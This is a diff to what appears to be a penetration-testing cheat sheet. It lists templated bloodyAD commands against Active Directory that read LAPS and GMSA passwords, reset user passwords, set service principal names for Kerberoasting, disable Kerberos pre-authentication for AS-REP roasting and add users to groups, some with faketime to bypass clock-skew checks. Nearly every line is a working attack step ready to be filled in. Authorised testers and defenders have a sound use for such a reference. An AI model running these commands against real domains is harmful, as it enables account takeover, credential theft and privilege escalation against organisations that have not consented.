@@ -4640,11 +4640,13 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USE
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                         // Read LAPS password
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                  // Read GMSA account password
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                           // Read GMSA account password using Kerberos
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
+
+faketime 'now + 31 hours'  bloodyAD --host <RHOST> -k --host <REALM> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                 // Set a password for a user
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
 faketime 'now + 8 hours' bloodyAD -d <RHOST> --host <FQDN> --dc-ip <IP> -u svc_ldap -p <PASSWORD> -k  set object 'victin_name' servicePrincipalName	// Set a Service Principal Name (SPN) using Kerberos
 KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
+
 KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD -d <RHOST> -k --dc-ip <IP> --host <FQDN> add uac -f DONT_REQ_PREAUTH <VICTIM>		// Enables AS-REP roasting by disabling Kerberos pre-authentication (due to GenericWrite privileges via RESTORE_USERS group)
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
